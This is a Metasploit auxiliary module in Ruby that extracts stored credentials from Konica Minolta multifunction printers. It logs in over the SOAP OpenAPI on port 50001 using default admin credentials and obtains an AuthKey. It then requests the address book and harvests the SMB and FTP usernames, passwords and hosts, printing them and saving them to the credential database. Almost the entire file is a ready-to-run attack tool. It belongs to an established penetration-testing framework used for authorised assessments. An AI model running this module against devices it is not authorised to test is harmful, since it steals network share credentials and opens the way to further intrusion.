##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Konica Minolta Password Extractor',
      'Description' => %q{
          This module will extract FTP and SMB account usernames and passwords
          from Konica Minolta multifunction printer (MFP) devices. Tested models include
          C224, C280, 283, C353, C360, 363, 420, C452, C452, C452, C454e, and C554.
        },
      'Author'      =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT('50001'),
        OptString.new('USER', [true, 'The default Admin user', 'Admin']),
        OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ])
  end

  # Creates the XML data to be sent that will extract AuthKey
  def generate_authkey_request_xlm(major, minor)
    user = datastore['USER']
    passwd = datastore['PASSWD']
    Nokogiri::XML::Builder.new do |xml|
      xml.send('SOAP-ENV:Envelope',
               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
        xml.send('SOAP-ENV:Header'){
          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
            xml.send('UserName', 'xmlns' => '') { xml.text '' }
            xml.send('Password', 'xmlns' => '') { xml.text '' }
            xml.send('Version', 'xmlns' => ''){
              xml.send('Major') { xml.text "#{major}" }
              xml.send('Minor') { xml.text "#{minor}" }
            }
            xml.send('AppManagementID', 'xmlns' => '') { xml.text '0' }
          }
        }
        xml.send('SOAP-ENV:Body') {
          xml.send('AppReqLogin', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
            xml.send('OperatorInfo'){
              xml.send('UserType') { xml.text "#{user}" }
              xml.send('Password') { xml.text "#{passwd}" }
            }
            xml.send('TimeOut') { xml.text '60' }
          }
        }
      }
    end
  end

  # Create XML data that will be sent to extract SMB and FTP passwords from device
  def generate_pwd_request_xlm(major, minor, authkey)
    Nokogiri::XML::Builder.new do |xml|
      xml.send('SOAP-ENV:Envelope',
               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
        xml.send('SOAP-ENV:Header'){
          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
            xml.send('UserName', 'xmlns' => '') { xml.text '' }
            xml.send('Password', 'xmlns' => '') { xml.text '' }
            xml.send('Version', 'xmlns' => ''){
              xml.send('Major') { xml.text "#{major}" }
              xml.send('Minor') { xml.text "#{minor}" }
            }
            xml.send('AppManagementID', 'xmlns' => '') { xml.text '1000' }
          }
        }
        xml.send('SOAP-ENV:Body'){
          xml.send('AppReqGetAbbr', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
            xml.send('OperatorInfo'){
              xml.send('AuthKey') { xml.text "#{authkey}" }
            }
            xml.send('AbbrListCondition'){
              xml.send('SearchKey') { xml.text 'None' }
              xml.send('WellUse') {  xml.text 'false' }
              xml.send('ObtainCondition'){
                xml.send('Type') { xml.text 'OffsetList' }
                xml.send('OffsetRange'){
                  xml.send('Start') { xml.text '1' }
                  xml.send('Length') { xml.text '100' }
                }
              }
              xml.send('BackUp') { xml.text 'true' }
              xml.send('BackUpPassword') { xml.text 'MYSKIMGS' }
            }
          }
        }
      }
    end
  end

  # This next section will post the XML soap messages for information gathering.
  def run_host(ip)
    print_status("Attempting to extract username and password from the host at #{peer}")
    version
  end

  # Validate XML Major Minor version
  def version
    response = send_request_cgi(
    {
      'uri'    => '/',
      'method' => 'POST',
      'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
    }, datastore['TIMEOUT'].to_i)
    if response.nil?
      print_error("No reponse from device")
      return
    else
      xml0_body = ::Nokogiri::XML(response.body)
      major_parse = xml0_body.xpath('//Major').text
      minor_parse = xml0_body.xpath('//Minor').text
      major = ("#{major_parse}")
      minor = ("#{minor_parse}")
      login(major, minor)
    end

    rescue ::Rex::ConnectionError
      print_error("Version check Connection failed")
  end

  # This section logs on and retrieves AuthKey token
  def login(major, minor)
    authreq_xml = generate_authkey_request_xlm(major, minor)
    # Send post request with crafted XML to login and retreive AuthKey
    begin
      response = send_request_cgi(
      {
        'uri'    => '/',
        'method' => 'POST',
        'data'   => authreq_xml.to_xml
      }, datastore['TIMEOUT'].to_i)
      if response.nil?
        print_error("No reponse from device")
        return
      else
        xml1_body = ::Nokogiri::XML(response.body)
        authkey_parse = xml1_body.xpath('//AuthKey').text
        authkey = ("#{authkey_parse}")
        extract(major, minor, authkey)
      end
    rescue ::Rex::ConnectionError
      print_error("Login Connection failed")
    end
  end

  # This section post xml soap message that will extract usernames and passwords
  def extract(major, minor, authkey)
    if (authkey != '')
      # create xml request to extract user credintial settings
      smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)
      # Send post request with crafted XML as data
      begin
        response = send_request_cgi(
        {
          'uri'    => '/',
          'method' => 'POST',
          'data'   => smbreq_xml.to_xml
        }, datastore['TIMEOUT'].to_i)
        if response.nil?
          print_error("No reponse from device")
          return
        else
          xml2_body = ::Nokogiri::XML(response.body)
          @smb_user = xml2_body.xpath('//SmbMode/User').map { |val1| val1.text }
          @smb_pass = xml2_body.xpath('//SmbMode/Password').map { |val2| val2.text }
          @smb_host = xml2_body.xpath('//SmbMode/Host').map { |val3| val3.text }
          @ftp_user = xml2_body.xpath('//FtpServerMode/User').map { |val4| val4.text }
          @ftp_pass = xml2_body.xpath('//FtpServerMode/Password').map { |val5| val5.text }
          @ftp_host = xml2_body.xpath('//FtpServerMode/Address').map { |val6| val6.text }
          @ftp_port = xml2_body.xpath('//FtpServerMode/PortNo').map { |val6| val6.text }
        end
      end
      i = 0
      # output SMB data
      @smb_user.each do
        shost = "#{@smb_host[i]}"
        sname = "#{@smb_user[i]}"
        sword = "#{@smb_pass[i]}"
        print_good("SMB Account:User=#{sname}:Password=#{sword}:Host=#{shost}:Port=139")
        register_creds('smb', shost, '139', sname, sword)
        i += 1
      end
      i = 0
      # output FTP data
      @ftp_user.each do
        fhost = "#{@ftp_host[i]}"
        fname = "#{@ftp_user[i]}"
        fword = "#{@ftp_pass[i]}"
        fport = "#{@ftp_port[i]}"
        print_good("FTP Account:User=#{fname}:Password=#{fword}:Host=#{fhost}:Port=#{fport}")
        register_creds('ftp', fhost, fport, fname, fword)
        i += 1
      end

    else
      print_error('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
      return
    end
  end

  def register_creds(service_name, remote_host, remote_port, username, password)
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      workspace_id: myworkspace.id,
      private_data: password,
      private_type: :password,
      username: username
    }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
